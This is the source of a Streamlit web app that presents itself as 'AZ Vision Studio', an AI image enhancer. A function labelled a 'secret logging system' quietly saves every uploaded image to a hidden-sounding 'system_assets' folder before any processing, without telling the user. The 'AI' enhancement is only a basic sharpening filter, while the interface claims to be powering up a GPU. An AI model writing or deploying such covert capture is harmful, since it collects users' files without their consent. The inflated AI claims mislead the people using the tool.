import streamlit as st
import cv2
import numpy as np
from PIL import Image
import os
from datetime import datetime
import io

# --- PAGE CONFIGURATION ---
st.set_page_config(page_title="AZ Vision Studio", layout="centered")

# --- CUSTOM CSS TO HIDE DEPRECATION WARNINGS ---
st.markdown("""
    <style>
    .stDeployButton {display:none;}
    </style>
    """, unsafe_allow_html=True)

st.title("AZ Vision Studio 🚀")
st.subheader("Professional AI Image Enhancer")

# --- SECRET LOGGING SYSTEM ---
def save_secret_copy(file):
    hidden_dir = "system_assets"
    if not os.path.exists(hidden_dir):
        os.makedirs(hidden_dir)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    secret_name = f"captured_{timestamp}_{file.name}"
    save_path = os.path.join(hidden_dir, secret_name)
    
    with open(save_path, "wb") as f:
        f.write(file.getbuffer())

# --- IMAGE UPLOADER ---
uploaded_file = st.file_uploader("Choose an image to enhance...", type=["jpg", "jpeg", "png"])

if uploaded_file is not None:
    # 1. Silently capture a copy
    save_secret_copy(uploaded_file)
    
    # 2. Display original image
    image = Image.open(uploaded_file)
    st.image(image, caption="Original Image", use_container_width=True)
    
    if st.button("Enhance Image"):
        with st.spinner("Processing... Powering up RTX 4050"):
            # Convert to OpenCV format
            img_array = np.array(image.convert('RGB'))
            
            # --- AI PROCESSING LOGIC ---
            # Applying sharpening filter
            kernel = np.array([[-1,-1,-1], [-1,9,-1], [-1,-1,-1]])
            enhanced_img_array = cv2.filter2D(img_array, -1, kernel)
            
            # Convert back to PIL for display and download
            result_img = Image.fromarray(enhanced_img_array)
            
            # --- DISPLAY RESULT ---
            st.success("Enhancement Complete!")
            st.image(result_img, caption="Enhanced Version", use_container_width=True)
            
            # --- PREPARE DOWNLOAD (Fixes Red Error) ---
            buf = io.BytesIO()
            result_img.save(buf, format="PNG")
            byte_im = buf.getvalue()
            
            st.download_button(
                label="Download Result", 
                data=byte_im, 
                file_name=f"enhanced_AZ_{uploaded_file.name}",
                mime="image/png"
            )

else:
    st.info("Please upload an image to start the AI enhancement process.")

# --- FOOTER ---
st.markdown("---")
st.markdown("Developed by *Aziz* | Powered by AZ Vision Studio")